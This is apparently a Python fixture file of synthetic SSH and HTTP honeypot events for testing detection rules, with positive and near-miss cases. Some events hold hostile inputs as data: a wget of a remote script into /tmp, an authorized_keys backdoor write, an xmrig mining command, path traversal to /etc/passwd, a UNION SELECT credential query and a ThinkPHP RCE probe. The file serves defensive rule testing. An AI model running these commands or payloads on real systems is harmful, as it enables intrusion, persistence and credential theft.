"""Machine-readable rule fixtures.

Each fixture is a list of raw events with deterministic timestamps plus the
expected rule ID. ``positive`` must fire the rule; ``near_miss`` must not.
CI fails when a shipped rule lacks either.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta

BASE = datetime(2026, 3, 12, 9, 0, 0, tzinfo=UTC)


def _t(offset_s: float) -> datetime:
    return BASE + timedelta(seconds=offset_s)


@dataclass(frozen=True, slots=True)
class Fixture:
    """One fixture case."""

    rule_id: str
    kind: str  # positive | near_miss
    events: tuple[dict, ...] = field(default_factory=tuple)
    expect_hit: bool = False
    description: str = ""


def ssh_event(offset: float, **fields: object) -> dict:
    """Build a raw SSH event payload at a deterministic offset."""
    payload: dict = {
        "ts": _t(offset).isoformat().replace("+00:00", "Z"),
        "service": "ssh",
        "src_ip": "203.0.113.10",
        "src_port": 44000,
        "session_id": "fix-0001",
    }
    payload.update(fields)
    return payload


def http_event(offset: float, **fields: object) -> dict:
    """Build a raw HTTP event payload at a deterministic offset."""
    payload: dict = {
        "ts": _t(offset).isoformat().replace("+00:00", "Z"),
        "service": "http",
        "src_ip": "198.51.100.7",
        "src_port": 51000,
        "session_id": "fix-0002",
        "http_method": "GET",
    }
    payload.update(fields)
    return payload


def _bruteforce(count: int, *, step: float = 2.0, ip: str = "203.0.113.10") -> tuple[dict, ...]:
    return tuple(
        ssh_event(index * step, event_type="login_attempt", src_ip=ip,
                  username=f"user{index}", password="wrongpass")
        for index in range(count)
    )


def _http_posts(count: int, *, step: float = 2.0, ip: str = "198.51.100.7") -> tuple[dict, ...]:
    return tuple(
        http_event(index * step, event_type="http_login_attempt", src_ip=ip,
                   http_method="POST", path="/wp-login.php", username="admin",
                   password="wrongpass")
        for index in range(count)
    )


def _http_paths(count: int, *, step: float = 1.0, ip: str = "198.51.100.7") -> tuple[dict, ...]:
    return tuple(
        http_event(index * step, event_type="http_request", src_ip=ip, path=f"/probe-{index}")
        for index in range(count)
    )


FIXTURES: tuple[Fixture, ...] = (
    # 001 -------------------------------------------------------------
    Fixture(
        rule_id="ssh-bruteforce-001",
        kind="positive",
        description="12 login attempts in under 60s from one IP",
        expect_hit=True,
        events=_bruteforce(12),
    ),
    Fixture(
        rule_id="ssh-bruteforce-001",
        kind="near_miss",
        description="9 login attempts, below the 10 threshold",
        events=_bruteforce(9),
    ),
    Fixture(
        rule_id="ssh-bruteforce-001",
        kind="near_miss",
        description="11 attempts spread over 4 minutes, outside the window",
        events=_bruteforce(11, step=25.0),
    ),
    # 002 -------------------------------------------------------------
    Fixture(
        rule_id="ssh-spray-002",
        kind="positive",
        description="10 distinct usernames within 300s",
        expect_hit=True,
        events=tuple(
            ssh_event(index * 10, event_type="login_attempt",
                      username=f"svc{index}", password="x")
            for index in range(10)
        ),
    ),
    Fixture(
        rule_id="ssh-spray-002",
        kind="near_miss",
        description="7 distinct usernames, below the threshold",
        events=tuple(
            ssh_event(index * 10, event_type="login_attempt",
                      username=f"svc{index}", password="x")
            for index in range(7)
        ),
    ),
    # 003 -------------------------------------------------------------
    Fixture(
        rule_id="ssh-default-creds-003",
        kind="positive",
        description="root/123456",
        expect_hit=True,
        events=(
            ssh_event(0, event_type="login_attempt", username="root", password="123456"),
        ),
    ),
    Fixture(
        rule_id="ssh-default-creds-003",
        kind="near_miss",
        description="non-default username with uncommon password",
        events=(
            ssh_event(0, event_type="login_attempt", username="zephyria",
                      password="Tr0ub4dor&3"),
        ),
    ),
    # 004 -------------------------------------------------------------
    Fixture(
        rule_id="ssh-login-success-004",
        kind="positive",
        description="honeypot accepted a login",
        expect_hit=True,
        events=(
            ssh_event(0, event_type="login_success", username="root", password="123456"),
        ),
    ),
    Fixture(
        rule_id="ssh-login-success-004",
        kind="near_miss",
        description="a rejected attempt is not a success",
        events=(
            ssh_event(0, event_type="login_attempt", username="root", password="zzz"),
        ),
    ),
    # 005 -------------------------------------------------------------
    Fixture(
        rule_id="ssh-download-exec-005",
        kind="positive",
        description="wget of an http URL",
        expect_hit=True,
        events=(
            ssh_event(0, event_type="command",
                      command="cd /tmp && wget http://198.51.100.9/x.sh -O x.sh"),
        ),
    ),
    Fixture(
        rule_id="ssh-download-exec-005",
        kind="near_miss",
        description="wget without a URL does not transfer anything",
        events=(
            ssh_event(0, event_type="command", command="wget --help"),
        ),
    ),
    # 006 -------------------------------------------------------------
    Fixture(
        rule_id="ssh-recon-cmds-006",
        kind="positive",
        description="uname -a recon",
        expect_hit=True,
        events=(
            ssh_event(0, event_type="command", command="uname -a"),
        ),
    ),
    Fixture(
        rule_id="ssh-recon-cmds-006",
        kind="near_miss",
        description="cat of a transfer command is not recon",
        events=(
            ssh_event(0, event_type="command", command="cat /tmp/x.sh"),
        ),
    ),
    # 007 -------------------------------------------------------------
    Fixture(
        rule_id="ssh-persistence-007",
        kind="positive",
        description="authorized_keys write intent",
        expect_hit=True,
        events=(
            ssh_event(0, event_type="command",
                      command="echo 'ssh-rsa AAAA' >> ~/.ssh/authorized_keys"),
        ),
    ),
    Fixture(
        rule_id="ssh-persistence-007",
        kind="near_miss",
        description="unrelated file read",
        events=(
            ssh_event(0, event_type="command", command="cat /etc/hosts"),
        ),
    ),
    # 008 -------------------------------------------------------------
    Fixture(
        rule_id="ssh-miner-008",
        kind="positive",
        description="stratum pool reference",
        expect_hit=True,
        events=(
            ssh_event(0, event_type="command",
                      command="./xmrig -o stratum+tcp://pool.example.invalid:3333"),
        ),
    ),
    Fixture(
        rule_id="ssh-miner-008",
        kind="near_miss",
        description="unrelated binary run",
        events=(
            ssh_event(0, event_type="command", command="./myapp --config /etc/app.conf"),
        ),
    ),
    # 009 -------------------------------------------------------------
    Fixture(
        rule_id="ssh-busybox-009",
        kind="positive",
        description="busybox applet probe",
        expect_hit=True,
        events=(
            ssh_event(0, event_type="command", command="busybox"),
        ),
    ),
    Fixture(
        rule_id="ssh-busybox-009",
        kind="near_miss",
        description="uptime is not a botnet probe",
        events=(
            ssh_event(0, event_type="command", command="uptime"),
        ),
    ),
    # 010 -------------------------------------------------------------
    Fixture(
        rule_id="http-sensitive-path-010",
        kind="positive",
        description="request for /.env",
        expect_hit=True,
        events=(http_event(0, event_type="http_request", path="/.env"),),
    ),
    Fixture(
        rule_id="http-sensitive-path-010",
        kind="near_miss",
        description="ordinary page request",
        events=(http_event(0, event_type="http_request", path="/about-us"),),
    ),
    # 011 -------------------------------------------------------------
    Fixture(
        rule_id="http-scanner-ua-011",
        kind="positive",
        description="sqlmap user agent",
        expect_hit=True,
        events=(
            http_event(0, event_type="http_request", path="/index.php",
                       user_agent="sqlmap/1.7.2#stable (https://sqlmap.org)"),
        ),
    ),
    Fixture(
        rule_id="http-scanner-ua-011",
        kind="near_miss",
        description="ordinary browser user agent",
        events=(
            http_event(0, event_type="http_request", path="/",
                       user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"),
        ),
    ),
    # 012 -------------------------------------------------------------
    Fixture(
        rule_id="http-login-brute-012",
        kind="positive",
        description="13 login POSTs in under 60s",
        expect_hit=True,
        events=_http_posts(13),
    ),
    Fixture(
        rule_id="http-login-brute-012",
        kind="near_miss",
        description="8 login POSTs, below the threshold",
        events=_http_posts(8),
    ),
    # 013 -------------------------------------------------------------
    Fixture(
        rule_id="http-traversal-013",
        kind="positive",
        description="double-dot traversal",
        expect_hit=True,
        events=(
            http_event(0, event_type="http_request", path="/product?f=../../../../etc/passwd"),
        ),
    ),
    Fixture(
        rule_id="http-traversal-013",
        kind="near_miss",
        description="single relative segment is not traversal",
        events=(
            http_event(0, event_type="http_request", path="/docs/../about"),
        ),
    ),
    # 014 -------------------------------------------------------------
    Fixture(
        rule_id="http-sqli-014",
        kind="positive",
        description="UNION SELECT probe",
        expect_hit=True,
        events=(
            http_event(0, event_type="http_request",
                       path="/items?id=1+UNION+SELECT+username,password+FROM+users"),
        ),
    ),
    Fixture(
        rule_id="http-sqli-014",
        kind="near_miss",
        description="ordinary id filter",
        events=(http_event(0, event_type="http_request", path="/items?id=42"),),
    ),
    # 015 -------------------------------------------------------------
    Fixture(
        rule_id="http-rce-probe-015",
        kind="positive",
        description="thinkphp invokefunction RCE probe",
        expect_hit=True,
        events=(
            http_event(0, event_type="http_request",
                       path="/index.php?s=/Index/think/app/invokefunction"),
        ),
    ),
    Fixture(
        rule_id="http-rce-probe-015",
        kind="near_miss",
        description="legitimate static asset",
        events=(http_event(0, event_type="http_request", path="/assets/app.js"),),
    ),
    # 016 -------------------------------------------------------------
    Fixture(
        rule_id="http-path-scan-016",
        kind="positive",
        description="18 distinct paths in under 30s",
        expect_hit=True,
        events=_http_paths(18),
    ),
    Fixture(
        rule_id="http-path-scan-016",
        kind="near_miss",
        description="repeated requests to one path",
        events=tuple(
            http_event(index, event_type="http_request", path="/index.html")
            for index in range(20)
        ),
    ),
    # 017 -------------------------------------------------------------
    Fixture(
        rule_id="cross-multi-service-017",
        kind="positive",
        description="one IP touches SSH then HTTP within 10 minutes",
        expect_hit=True,
        events=(
            ssh_event(0, event_type="connect", src_ip="203.0.113.77"),
            ssh_event(5, event_type="login_attempt", src_ip="203.0.113.77",
                      username="root", password="x"),
            http_event(30, event_type="http_request", src_ip="203.0.113.77", path="/.env"),
        ),
    ),
    Fixture(
        rule_id="cross-multi-service-017",
        kind="near_miss",
        description="SSH only from one IP",
        events=(
            ssh_event(0, event_type="connect", src_ip="203.0.113.78"),
            ssh_event(5, event_type="login_attempt", src_ip="203.0.113.78",
                      username="root", password="x"),
        ),
    ),
)